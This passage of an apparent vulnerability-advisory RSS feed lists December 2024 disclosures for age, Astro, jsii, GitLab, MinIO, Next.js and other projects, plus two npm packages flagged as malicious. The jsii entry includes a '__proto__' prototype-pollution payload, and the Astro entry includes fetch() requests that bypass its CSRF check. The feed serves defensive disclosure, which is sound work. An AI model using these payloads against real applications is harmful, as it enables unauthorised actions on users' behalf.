                    <title>GHSA-32gq-x56h-299c: 0 | <b>age vulnerable to malicious plugin names, recipients, or identities causing arbitrary binary execution</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-32gq-x56h-299c</link>
                    <pubDate>2024-12-18T18:23:06Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-32gq-x56h-299c'>https://osv.dev/vulnerability/GHSA-32gq-x56h-299c</a><br>
                            <b>Published:</b> 2024-12-18T18:23:06Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/FiloSottile/age/security/advisories/GHSA-32gq-x56h-299c'>https://github.com/FiloSottile/age/security/advisories/GHSA-32gq-x56h-299c</a></li><li>- <a target='_blank' href='https://github.com/str4d/rage/security/advisories/GHSA-4fg7-vxc8-qx5w'>https://github.com/str4d/rage/security/advisories/GHSA-4fg7-vxc8-qx5w</a></li><li>- <a target='_blank' href='https://github.com/FiloSottile/age/commit/482cf6fc9babd3ab06f6606762aac10447222201'>https://github.com/FiloSottile/age/commit/482cf6fc9babd3ab06f6606762aac10447222201</a></li><li>- <a target='_blank' href='https://github.com/FiloSottile/age'>https://github.com/FiloSottile/age</a></li></ul><br>
                            <b>Details:</b> <b>age vulnerable to malicious plugin names, recipients, or identities causing arbitrary binary execution</b><br>A plugin name containing a path separator may allow an attacker to execute an arbitrary binary.

Such a plugin name can be provided to the age CLI through an attacker-controlled recipient or identity string, or to the [`plugin.NewIdentity`](https:&#x2F;&#x2F;pkg.go.dev&#x2F;filippo.io&#x2F;age&#x2F;plugin#NewIdentity), [`plugin.NewIdentityWithoutData`](https:&#x2F;&#x2F;pkg.go.dev&#x2F;filippo.io&#x2F;age&#x2F;plugin#NewIdentityWithoutData), or [`plugin.NewRecipient`](https:&#x2F;&#x2F;pkg.go.dev&#x2F;filippo.io&#x2F;age&#x2F;plugin#NewRecipient) APIs.

On UNIX systems, a directory matching `${TMPDIR:-&#x2F;tmp}&#x2F;age-plugin-*` needs to exist for the attack to succeed.

The binary is executed with a single flag, either `--age-plugin=recipient-v1` or `--age-plugin=identity-v1`. The standard input includes the recipient or identity string, and the random file key (if encrypting) or the header of the file (if decrypting). The format is constrained by the [age-plugin](https:&#x2F;&#x2F;c2sp.org&#x2F;age-plugin) protocol.

An equivalent issue was fixed by the [rage](https:&#x2F;&#x2F;github.com&#x2F;str4d&#x2F;rage) project, see advisory [GHSA-4fg7-vxc8-qx5w](https:&#x2F;&#x2F;github.com&#x2F;str4d&#x2F;rage&#x2F;security&#x2F;advisories&#x2F;GHSA-4fg7-vxc8-qx5w).

Thanks to ⬡-49016 for reporting this.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-hvm9-wc8j-mgrc: 8.9 | <b>TShock Security Escalation Exploit</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-hvm9-wc8j-mgrc</link>
                    <pubDate>2024-12-18T18:19:12Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-hvm9-wc8j-mgrc'>https://osv.dev/vulnerability/GHSA-hvm9-wc8j-mgrc</a><br>
                            <b>Published:</b> 2024-12-18T18:19:12Z<br>
                            <b>Severity:</b> 8.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Pryaxis/TShock/security/advisories/GHSA-hvm9-wc8j-mgrc'>https://github.com/Pryaxis/TShock/security/advisories/GHSA-hvm9-wc8j-mgrc</a></li><li>- <a target='_blank' href='https://github.com/Pryaxis/TShock/commit/5075997264b48e27960e3446a948ecb0ea0f5a03'>https://github.com/Pryaxis/TShock/commit/5075997264b48e27960e3446a948ecb0ea0f5a03</a></li><li>- <a target='_blank' href='https://github.com/Pryaxis/TShock'>https://github.com/Pryaxis/TShock</a></li></ul><br>
                            <b>Details:</b> <b>TShock Security Escalation Exploit</b><br>### Impact
An issue with the way OTAPI manages client connections results in stale UUIDs remaining on `RemoteClient` instances after a player disconnects.

Because of this, if the following conditions are met a player may assume the login state of a previously connected player:
1. The server has UUID login enabled
2. An authenticated player disconnects
3. A subsequent player connects with a modified client that does not send the `ClientUUID#68` packet during connection
4. The server assigns the same `RemoteClient` object that belonged to the originally authenticated player to the newly connected player


### Patches
TShock 5.2.1 hotfixes this issue. A more robust fix will be made to OTAPI itself.

### Workarounds
Implement a RemoteClient reset event handler in a plugin like so:
```csharp
public override void Initialize()
{
        On.Terraria.RemoteClient.Reset += RemoteClient_Reset;
}

private static void RemoteClient_Reset(On.Terraria.RemoteClient.orig_Reset orig, RemoteClient client)
{
	client.ClientUUID = null;
        orig(client);
}
```


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-m56h-5xx3-2jc2: 3.7 | <b>Prototype pollution in jsii.configureCategories</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-m56h-5xx3-2jc2</link>
                    <pubDate>2024-12-18T15:50:09Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-m56h-5xx3-2jc2'>https://osv.dev/vulnerability/GHSA-m56h-5xx3-2jc2</a><br>
                            <b>Published:</b> 2024-12-18T15:50:09Z<br>
                            <b>Severity:</b> 3.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2'>https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li><li>- <a target='_blank' href='https://github.com/aws/jsii-compiler'>https://github.com/aws/jsii-compiler</a></li><li>- <a target='_blank' href='https://github.com/aws/jsii-compiler/releases/tag/v5.4.46'>https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li><li>- <a target='_blank' href='https://github.com/aws/jsii-compiler/releases/tag/v5.5.15'>https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li><li>- <a target='_blank' href='https://github.com/aws/jsii-compiler/releases/tag/v5.6.4'>https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li><li>- <a target='_blank' href='https://github.com/aws/jsii-compiler/releases/tag/v5.7.3'>https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li></ul><br>
                            <b>Details:</b> <b>Prototype pollution in jsii.configureCategories</b><br>## Summary

`jsii` is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.
When loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.

## Impact

You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the `jsii.configureCategories()` function. In that case, a user can craft input in such a way that, following the invocation, a field named &quot;category&quot; with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named &quot;category&quot;, even if it shouldn&#x27;t. 

**This will not affect jsii itself, but it might affect the application you have loaded jsii into.**

&amp;gt; The function `jsii.configureCategories()` is used to configure the severity (error, warning, etc.) of various jsii diagnostics.

**Impacted versions: &amp;lt;=5.7.2, &amp;lt;=5.6.3, &amp;lt;=5.5.14, &amp;lt;=5.4.45** 

**Example:**

```js
const jsii = require(&#x27;jsii&#x27;);

&#x2F;&#x2F; prints &#x27;undefined&#x27;
console.log(JSON.stringify({}.category))

&#x2F;&#x2F; calling &#x27;configureCategories&#x27; with user input
jsii.configureCategories(JSON.parse(&#x27;{&quot;__proto__&quot;: &quot;user-input&quot;}&#x27;))

&#x2F;&#x2F; from this point onwards, every single object literal in the program
&#x2F;&#x2F; will contain the &#x27;category&#x27; key, with user controlled value
console.log(JSON.stringify({}.category)) &#x2F;&#x2F; prints &#x27;user-input&#x27;


&#x2F;&#x2F; this can affect the execution of the main program in case it also makes 
&#x2F;&#x2F; use of an object key called &#x27;category&#x27;. for example, if the main programs 
&#x2F;&#x2F; happens to have code like this:

const x = {} &#x2F;&#x2F; some object in the main program (not necessarily empty)

if (x.category) {
  &#x2F;&#x2F; this block will always be executed, effectively 
  &#x2F;&#x2F; changing the behavior of the main program.
  console.log(&#x27;Do something&#x27;)
} else {
  console.log(&#x27;Do something else&#x27;)
}
```

For more information about javascript prototype pollution, see [1].

## Patches

A patch is included in versions [5.7.3](https:&#x2F;&#x2F;github.com&#x2F;aws&#x2F;jsii-compiler&#x2F;releases&#x2F;tag&#x2F;v5.7.3), [5.6.4](https:&#x2F;&#x2F;github.com&#x2F;aws&#x2F;jsii-compiler&#x2F;releases&#x2F;tag&#x2F;v5.6.4), [5.5.15](https:&#x2F;&#x2F;github.com&#x2F;aws&#x2F;jsii-compiler&#x2F;releases&#x2F;tag&#x2F;v5.5.15), [5.4.46](https:&#x2F;&#x2F;github.com&#x2F;aws&#x2F;jsii-compiler&#x2F;releases&#x2F;tag&#x2F;v5.4.46)

## Workarounds

Sanitize user input to configureCategories() by stripping the __proto__ property if detected.

## References

If you have any questions or comments about this advisory, we ask that you contact AWS&#x2F;Amazon Security via our issue reporting page [2] or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.

[1] https:&#x2F;&#x2F;learn.snyk.io&#x2F;lesson&#x2F;prototype-pollution&#x2F;

[2] [https:&#x2F;&#x2F;aws.amazon.com&#x2F;security&#x2F;issue-reporting](https:&#x2F;&#x2F;aws.amazon.com&#x2F;security&#x2F;vulnerability-reporting)

## Credits

We would like to thank _Tariq Hawis_ for collaborating on this issue through the coordinated vulnerability disclosure process.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-c4pw-33h3-35xw: 5.9 | <b>Atro CSRF Middleware Bypass (security.checkOrigin)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-c4pw-33h3-35xw</link>
                    <pubDate>2024-12-18T15:02:37Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-c4pw-33h3-35xw'>https://osv.dev/vulnerability/GHSA-c4pw-33h3-35xw</a><br>
                            <b>Published:</b> 2024-12-18T15:02:37Z<br>
                            <b>Severity:</b> 5.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/withastro/astro/security/advisories/GHSA-c4pw-33h3-35xw'>https://github.com/withastro/astro/security/advisories/GHSA-c4pw-33h3-35xw</a></li><li>- <a target='_blank' href='https://github.com/withastro/astro/commit/e7d14c374b9d45e27089994a4eb72186d05514de'>https://github.com/withastro/astro/commit/e7d14c374b9d45e27089994a4eb72186d05514de</a></li><li>- <a target='_blank' href='https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests'>https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests</a></li><li>- <a target='_blank' href='https://github.com/withastro/astro'>https://github.com/withastro/astro</a></li><li>- <a target='_blank' href='https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts'>https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts</a></li></ul><br>
                            <b>Details:</b> <b>Atro CSRF Middleware Bypass (security.checkOrigin)</b><br>### Summary

A bug in Astro’s CSRF-protection middleware allows requests to bypass CSRF checks.

### Details

When the `security.checkOrigin` configuration option is set to `true`, Astro middleware will perform a CSRF check. (Source code: https:&#x2F;&#x2F;github.com&#x2F;withastro&#x2F;astro&#x2F;blob&#x2F;6031962ab5f56457de986eb82bd24807e926ba1b&#x2F;packages&#x2F;astro&#x2F;src&#x2F;core&#x2F;app&#x2F;middlewares.ts)

For example, with the following Astro configuration:

```js
&#x2F;&#x2F; astro.config.mjs
import { defineConfig } from &#x27;astro&#x2F;config&#x27;;
import node from &#x27;@astrojs&#x2F;node&#x27;;

export default defineConfig({
	output: &#x27;server&#x27;,
	security: { checkOrigin: true },
	adapter: node({ mode: &#x27;standalone&#x27; }),
});
```

A request like the following would be blocked if made from a different origin:

```js
&#x2F;&#x2F; fetch API or &amp;lt;form action=&quot;https:&#x2F;&#x2F;test.example.com&#x2F;&quot; method=&quot;POST&quot;&amp;gt;
fetch(&#x27;https:&#x2F;&#x2F;test.example.com&#x2F;&#x27;, {
	method: &#x27;POST&#x27;,
	credentials: &#x27;include&#x27;,
	body: &#x27;a=b&#x27;,
	headers: { &#x27;Content-Type&#x27;: &#x27;application&#x2F;x-www-form-urlencoded&#x27; },
});
&#x2F;&#x2F; =&amp;gt; Cross-site POST form submissions are forbidden
```

However, a vulnerability exists that can bypass this security.

#### Pattern 1: Requests with a semicolon after the `Content-Type`

A semicolon-delimited parameter is allowed after the type in `Content-Type`.

Web browsers will treat a `Content-Type` such as `application&#x2F;x-www-form-urlencoded; abc` as a [simple request](https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTTP&#x2F;CORS#simple_requests) and will not perform preflight validation. In this case, CSRF is not blocked as expected.

```js
fetch(&#x27;https:&#x2F;&#x2F;test.example.com&#x27;, {
	method: &#x27;POST&#x27;,
	credentials: &#x27;include&#x27;,
	body: &#x27;test&#x27;,
	headers: { &#x27;Content-Type&#x27;: &#x27;application&#x2F;x-www-form-urlencoded; abc&#x27; },
});
&#x2F;&#x2F; =&amp;gt; Server-side functions are executed (Response Code 200).
```

#### Pattern 2: Request without `Content-Type` header

The `Content-Type` header is not required for a request. The following examples are sent without a `Content-Type` header, resulting in CSRF.

```js
&#x2F;&#x2F; Pattern 2.1 Request without body
fetch(&#x27;http:&#x2F;&#x2F;test.example.com&#x27;, { method: &#x27;POST&#x27;, credentials: &#x27;include&#x27; });

&#x2F;&#x2F; Pattern 2.2 Blob object without type
fetch(&#x27;https:&#x2F;&#x2F;test.example.com&#x27;, {
	method: &#x27;POST&#x27;,
	credentials: &#x27;include&#x27;,
	body: new Blob([&#x27;a=b&#x27;], {}),
});
```

### Impact

Bypass CSRF protection implemented with CSRF middleware.

&amp;gt; [!Note]
&amp;gt; Even with `credentials: &#x27;include&#x27;`, browsers may not send cookies due to third-party cookie blocking. This feature depends on the browser version and settings, and is for privacy protection, not as a CSRF measure.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-8116: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-8116</link>
                    <pubDate>2024-12-18T07:12:29.491Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-8116'>https://osv.dev/vulnerability/BIT-gitlab-2024-8116</a><br>
                            <b>Published:</b> 2024-12-18T07:12:29.491Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/480509'>https://gitlab.com/gitlab-org/gitlab/-/issues/480509</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2666216'>https://hackerone.com/reports/2666216</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab CE&#x2F;EE affecting all versions from 16.9 before 17.4.6, 17.5 before 17.5.4, and 17.6 before 17.6.2. By using a specific GraphQL query, under specific conditions an unauthorized user can retrieve branch names.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-minio-2024-55949: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-minio-2024-55949</link>
                    <pubDate>2024-12-18T07:12:19.992Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-minio-2024-55949'>https://osv.dev/vulnerability/BIT-minio-2024-55949</a><br>
                            <b>Published:</b> 2024-12-18T07:12:19.992Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/minio/minio/commit/580d9db85e04f1b63cc2909af50f0ed08afa965f'>https://github.com/minio/minio/commit/580d9db85e04f1b63cc2909af50f0ed08afa965f</a></li><li>- <a target='_blank' href='https://github.com/minio/minio/commit/f246c9053f9603e610d98439799bdd2a6b293427'>https://github.com/minio/minio/commit/f246c9053f9603e610d98439799bdd2a6b293427</a></li><li>- <a target='_blank' href='https://github.com/minio/minio/pull/20756'>https://github.com/minio/minio/pull/20756</a></li><li>- <a target='_blank' href='https://github.com/minio/minio/security/advisories/GHSA-cwq8-g58r-32hg'>https://github.com/minio/minio/security/advisories/GHSA-cwq8-g58r-32hg</a></li></ul><br>
                            <b>Details:</b> <b></b><br>MinIO is a high-performance, S3 compatible object store, open sourced under GNU AGPLv3 license. Minio is subject to a privilege escalation in IAM import API, all users are impacted since MinIO commit `580d9db85e04f1b63cc2909af50f0ed08afa965f`. This issue has been addressed in commit `f246c9053f9603e610d98439799bdd2a6b293427` which is included in RELEASE.2024-12-13T22-19-12Z. There are no workarounds possible, all users are advised to upgrade immediately.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-8650: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-8650</link>
                    <pubDate>2024-12-18T07:10:27.388Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-8650'>https://osv.dev/vulnerability/BIT-gitlab-2024-8650</a><br>
                            <b>Published:</b> 2024-12-18T07:10:27.388Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/486300'>https://gitlab.com/gitlab-org/gitlab/-/issues/486300</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2705909'>https://hackerone.com/reports/2705909</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions from 15.0 prior to 17.4.6, 17.5 prior to 17.5.4, and 17.6 prior to 17.6.2 that allowed non-member users to view unresolved threads marked as internal notes in public projects merge requests.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-jhh6-6fhp-q2xp: 7.5 | <b>Open Cluster Management vulnerable to Trust Boundary Violation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-jhh6-6fhp-q2xp</link>
                    <pubDate>2024-12-18T00:31:23Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-jhh6-6fhp-q2xp'>https://osv.dev/vulnerability/GHSA-jhh6-6fhp-q2xp</a><br>
                            <b>Published:</b> 2024-12-18T00:31:23Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/open-cluster-management-io/registration-operator/issues/361'>https://github.com/open-cluster-management-io/registration-operator/issues/361</a></li><li>- <a target='_blank' href='https://github.com/open-cluster-management-io/ocm/pull/325'>https://github.com/open-cluster-management-io/ocm/pull/325</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2024-9779'>https://access.redhat.com/security/cve/CVE-2024-9779</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2317916'>https://bugzilla.redhat.com/show_bug.cgi?id=2317916</a></li><li>- <a target='_blank' href='https://github.com/open-cluster-management-io/OCM'>https://github.com/open-cluster-management-io/OCM</a></li><li>- <a target='_blank' href='https://github.com/open-cluster-management-io/ocm/releases/tag/v0.13.0'>https://github.com/open-cluster-management-io/ocm/releases/tag/v0.13.0</a></li></ul><br>
                            <b>Details:</b> <b>Open Cluster Management vulnerable to Trust Boundary Violation</b><br>A flaw was found in Open Cluster Management (OCM) when a user has access to the worker nodes which contain the cluster-manager or klusterlet deployments. The cluster-manager deployment uses a service account with the same name &quot;cluster-manager&quot; which is bound to a ClusterRole also named &quot;cluster-manager&quot;, which includes the permission to create Pod resources. If this deployment runs a pod on an attacker-controlled node, the attacker can obtain the cluster-manager&#x27;s token and steal any service account token by creating and mounting the target service account to control the whole cluster.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-6mpx-pmgp-ww49: 5.7 | <b>Duplicate Advisory: Keycloak vulnerable to Cleartext Transmission of Sensitive Information</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-6mpx-pmgp-ww49</link>
                    <pubDate>2024-12-18T00:31:23Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-6mpx-pmgp-ww49'>https://osv.dev/vulnerability/GHSA-6mpx-pmgp-ww49</a><br>
                            <b>Published:</b> 2024-12-18T00:31:23Z<br>
                            <b>Severity:</b> 5.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/issues/28750'>https://github.com/keycloak/keycloak/issues/28750</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/issues/34644'>https://github.com/keycloak/keycloak/issues/34644</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/pull/28756'>https://github.com/keycloak/keycloak/pull/28756</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/pull/34668'>https://github.com/keycloak/keycloak/pull/34668</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/commit/071032a108bd9e9fce9e66d00c36d56bd4b334df'>https://github.com/keycloak/keycloak/commit/071032a108bd9e9fce9e66d00c36d56bd4b334df</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/commit/36defd5f33b2da5d705f179bbaa21c28b13a9996'>https://github.com/keycloak/keycloak/commit/36defd5f33b2da5d705f179bbaa21c28b13a9996</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2024-10973'>https://access.redhat.com/security/cve/CVE-2024-10973</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2324361'>https://bugzilla.redhat.com/show_bug.cgi?id=2324361</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak'>https://github.com/keycloak/keycloak</a></li></ul><br>
                            <b>Details:</b> <b>Duplicate Advisory: Keycloak vulnerable to Cleartext Transmission of Sensitive Information</b><br># Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-g6qq-c9f9-2772. This link is maintained to preserve external references.

# Original Description
A vulnerability was found in Keycloak. The environment option `KC_CACHE_EMBEDDED_MTLS_ENABLED` does not work and the JGroups replication configuration is always used in plain text which can allow an attacker that has access to adjacent networks related to JGroups to read sensitive information.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-m9hc-vxjj-4x6q: 6.5 | <b>PGHoard Path Traversal vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-m9hc-vxjj-4x6q</link>
                    <pubDate>2024-12-17T21:37:18Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-m9hc-vxjj-4x6q'>https://osv.dev/vulnerability/GHSA-m9hc-vxjj-4x6q</a><br>
                            <b>Published:</b> 2024-12-17T21:37:18Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Aiven-Open/pghoard/security/advisories/GHSA-m9hc-vxjj-4x6q'>https://github.com/Aiven-Open/pghoard/security/advisories/GHSA-m9hc-vxjj-4x6q</a></li><li>- <a target='_blank' href='https://github.com/Aiven-Open/pghoard/commit/fe9947642cc73bcacf6d19b93eb98f442223fb47'>https://github.com/Aiven-Open/pghoard/commit/fe9947642cc73bcacf6d19b93eb98f442223fb47</a></li><li>- <a target='_blank' href='https://github.com/Aiven-Open/pghoard'>https://github.com/Aiven-Open/pghoard</a></li></ul><br>
                            <b>Details:</b> <b>PGHoard Path Traversal vulnerability</b><br>A vulnerability has been discovered that could allow an attacker to acquire disk access with privileges equivalent to those of pghoard, allowing for unintended path traversal.  Depending on the permissions&#x2F;privileges assigned to pghoard, this could allow disclosure of sensitive information.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-hxr6-2p24-hf98: 0 | <b>Traefik affected by CVE-2024-53259</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-hxr6-2p24-hf98</link>
                    <pubDate>2024-12-17T15:13:44Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-hxr6-2p24-hf98'>https://osv.dev/vulnerability/GHSA-hxr6-2p24-hf98</a><br>
                            <b>Published:</b> 2024-12-17T15:13:44Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/traefik/traefik/security/advisories/GHSA-hxr6-2p24-hf98'>https://github.com/traefik/traefik/security/advisories/GHSA-hxr6-2p24-hf98</a></li><li>- <a target='_blank' href='https://github.com/traefik/traefik'>https://github.com/traefik/traefik</a></li><li>- <a target='_blank' href='https://github.com/traefik/traefik/releases/tag/v2.11.15'>https://github.com/traefik/traefik/releases/tag/v2.11.15</a></li><li>- <a target='_blank' href='https://github.com/traefik/traefik/releases/tag/v3.2.2'>https://github.com/traefik/traefik/releases/tag/v3.2.2</a></li></ul><br>
                            <b>Details:</b> <b>Traefik affected by CVE-2024-53259</b><br>There is a potential vulnerability in Traefik managing HTTP&#x2F;3 connections.

More details in the [CVE-2024-53259](https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2024-53259).

## Patches

- https:&#x2F;&#x2F;github.com&#x2F;traefik&#x2F;traefik&#x2F;releases&#x2F;tag&#x2F;v2.11.15
- https:&#x2F;&#x2F;github.com&#x2F;traefik&#x2F;traefik&#x2F;releases&#x2F;tag&#x2F;v3.2.2

## Workarounds

No workaround

## For more information

If you have any questions or comments about this advisory, please [open an issue](https:&#x2F;&#x2F;github.com&#x2F;traefik&#x2F;traefik&#x2F;issues).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7gfc-8cq8-jh5f: 7.5 | <b>Next.js authorization bypass vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7gfc-8cq8-jh5f</link>
                    <pubDate>2024-12-17T15:09:06Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7gfc-8cq8-jh5f'>https://osv.dev/vulnerability/GHSA-7gfc-8cq8-jh5f</a><br>
                            <b>Published:</b> 2024-12-17T15:09:06Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/vercel/next.js/security/advisories/GHSA-7gfc-8cq8-jh5f'>https://github.com/vercel/next.js/security/advisories/GHSA-7gfc-8cq8-jh5f</a></li><li>- <a target='_blank' href='https://github.com/vercel/next.js/commit/1c8234eb20bc8afd396b89999a00f06b61d72d7b'>https://github.com/vercel/next.js/commit/1c8234eb20bc8afd396b89999a00f06b61d72d7b</a></li><li>- <a target='_blank' href='https://github.com/vercel/next.js'>https://github.com/vercel/next.js</a></li><li>- <a target='_blank' href='https://github.com/vercel/next.js/releases/tag/v14.2.15'>https://github.com/vercel/next.js/releases/tag/v14.2.15</a></li></ul><br>
                            <b>Details:</b> <b>Next.js authorization bypass vulnerability</b><br>### Impact
If a Next.js application is performing authorization in middleware based on pathname, it was possible for this authorization to be bypassed.

### Patches
This issue was patched in Next.js `14.2.15` and later.

If your Next.js application is hosted on Vercel, this vulnerability has been automatically mitigated, regardless of Next.js version.

### Workarounds
There are no official workarounds for this vulnerability.

#### Credits
We&#x27;d like to thank [tyage](http:&#x2F;&#x2F;github.com&#x2F;tyage) (GMO CyberSecurity by IERAE) for responsible disclosure of this issue.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>MAL-2024-11905: 0 | <b>Malicious code in solara-config (npm)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#MAL-2024-11905</link>
                    <pubDate>2024-12-17T08:04:13Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/MAL-2024-11905'>https://osv.dev/vulnerability/MAL-2024-11905</a><br>
                            <b>Published:</b> 2024-12-17T08:04:13Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://npmjs.com/package/solara-config'>https://npmjs.com/package/solara-config</a></li><li>- <a target='_blank' href='https://socket.dev/blog/skuld-infostealer-returns-to-npm'>https://socket.dev/blog/skuld-infostealer-returns-to-npm</a></li></ul><br>
                            <b>Details:</b> <b>Malicious code in solara-config (npm)</b><br>
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (6d6e86743114e65716ebcc22493a5d16e0e807c0701cf4233fac1c9eb47f821a)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>MAL-2024-11908: 0 | <b>Malicious code in windows-version-check (npm)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#MAL-2024-11908</link>
                    <pubDate>2024-12-17T08:04:13Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/MAL-2024-11908'>https://osv.dev/vulnerability/MAL-2024-11908</a><br>
                            <b>Published:</b> 2024-12-17T08:04:13Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
